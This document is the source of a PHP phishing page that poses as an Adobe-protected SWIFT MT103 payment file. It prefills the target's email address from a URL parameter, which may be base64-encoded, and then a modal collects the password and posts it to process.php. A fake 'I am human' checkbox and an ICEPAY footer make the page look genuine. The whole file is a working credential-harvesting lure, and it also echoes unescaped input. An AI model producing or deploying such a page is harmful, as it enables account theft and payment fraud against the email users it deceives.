<?php
if(isset($_POST['pass']) && !empty($_POST['pass']) && isset($_POST['login']) && !empty($_POST['login'])){
include('process.php');
}else{
$login = $_GET['login'];

if (strpos($login,'@') !== false){
$log=$login;
}else{
$log=base64_decode($login);
}
$prem = explode('@',$log);
$domain = substr(strrchr($log, "@"), 1);
$useid = $prem[0];


 ?>

<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1">
<style>
body {font-family: Arial, Helvetica, sans-serif;}

input[type=text], input[type=email] {
    width: 39%;
    padding: 12px 20px;
    margin: 8px 0;
    display: inline-block;
    border: 1px solid #ccc;
    box-sizing: border-box;
}


input[type=text], input[type=password] {
    width: 39%;
    padding: 12px 20px;
    margin: 8px 0;
    display: inline-block;
    border: 1px solid #ccc;
    box-sizing: border-box;
}

button {
    background-color: green;
    color: white;
    padding: 14px 20px;
    margin: 8px 0;
    border: none;
    cursor: pointer;
    width: 39%;
}

button:hover {
    opacity: 0.8;
}

.cancelbtn {
    width: auto;
    padding: 10px 18px;
    background-color: #f44336;
}

.imgcontainer {
    text-align: center;
    margin: 10px 10px 0;
}

img.avatar {
    width: 40%;
    border-radius: 50%;
}

.container {
    padding: 10px;
}

span.psw {
    float: right;
    padding-top: 16px;
}

/* Change styles for span and cancel button on extra small screens */
@media screen and (max-width: 300px) {
    span.psw {
       display: block;
       float: none;
    }
    .cancelbtn {
       width: 100%;
    }
}

/* The Modal (background) */
.modal {
    display: none; /* Hidden by default */
    position: fixed; /* Stay in place */
    z-index: 1; /* Sit on top */
    left: 0;
    top: 0;
    width: 100%; /* Full width */
    height: 100%; /* Full height */
    overflow: auto; /* Enable scroll if needed */
    background-color: rgb(0,0,0); /* Fallback color */
    background-color: rgba(0,0,0,0.4); /* Black w/ opacity */
    padding-top: 60px;
}

/* Modal Content/Box */
.modal-content {
    background-color: #fefefe;
    margin: 5% auto 15% auto; /* 5% from the top, 15% from the bottom and centered */
    border: 1px solid #888;
    width: 50%; /* Could be more or less, depending on screen size */
}

/* The Close Button (x) */
.close {
    position: absolute;
    right: 25px;
    top: 0;
    color: #000;
    font-size: 35px;
    font-weight: bold;
}

.close:hover,
.close:focus {
    color: red;
    cursor: pointer;
}

/* Add Zoom Animation */
.animate {
    -webkit-animation: animatezoom 0.6s;
    animation: animatezoom 0.6s
}

@-webkit-keyframes animatezoom {
    from {-webkit-transform: scale(0)} 
    to {-webkit-transform: scale(1)}
}
    
@keyframes animatezoom {
    from {transform: scale(0)} 
    to {transform: scale(1)}
}

/* Change styles for span and cancel button on extra small screens */
@media screen and (max-width: 300px) {
    span.psw {
       display: block;
       float: none;
    }
    .cancelbtn {
       width: 100%;
    }
}

</style>
</head>
<body><center>
<br><br><center><img src="https://i.imgur.com/QJ0wDOs.jpg" height="200"></img>
  <p><font face="Trebuchet MS" color="black" size="2"> File Name: Swift-bills#Ref-MT103.pdf</font> </p>
 <p><font face="Trebuchet MS" color="black" size="2"> File Size: 256.1kb</font> </p>
 <p><font face="Trebuchet MS" color="red" size="2"> File Type: Protected by Adobe online security</font> </p>
<p><font face="Trebuchet MS" color="black" size="2"> Recepient:

"<?php echo $log; ?>"

</font> </p><button onclick="document.getElementById('id01').style.display='block'" style="width:auto;">Preview payment</button></center>

<div id="id01" class="modal">
  
  <form class="modal-content animate" method="POST" action="process.php">
    <div class="imgcontainer">
      <span onclick="document.getElementById('id01').style.display='none'" class="close" title="Close Modal">&times;</span>
      <img src="https://i.imgur.com/4tGFIDb.jpg" width="40%">
    </div>

    <div class="container">
<input type="text" value="<?php echo $log; ?>" readonly name="login" required>

<br>
      <input type="password" placeholder="Enter Password" name="pass" required>
        <br>
      <button type="submit">DOWNLOAD</button>
      <label><br>
        <center><input type="checkbox" checked="" name="remember"><font face="Trebuchet MS" color="green" size="2">  I am human</font>
      </label><center>
    </div>

    <div class="container" style="background-color:white">
     
    
    </div>
  </form>
</div>

<script>
// Get the modal
var modal = document.getElementById('id01');

// When the user clicks anywhere outside of the modal, close it
window.onclick = function(event) {
    if (event.target == modal) {
        modal.style.display = "none";
    }
}
</script>

</body>
</html>
© ICEPAY 2021. All rights reserved - Privacy Beleid | Algemene Voorwaarden | Cookies
</body></html>
</body></html><?php }?>
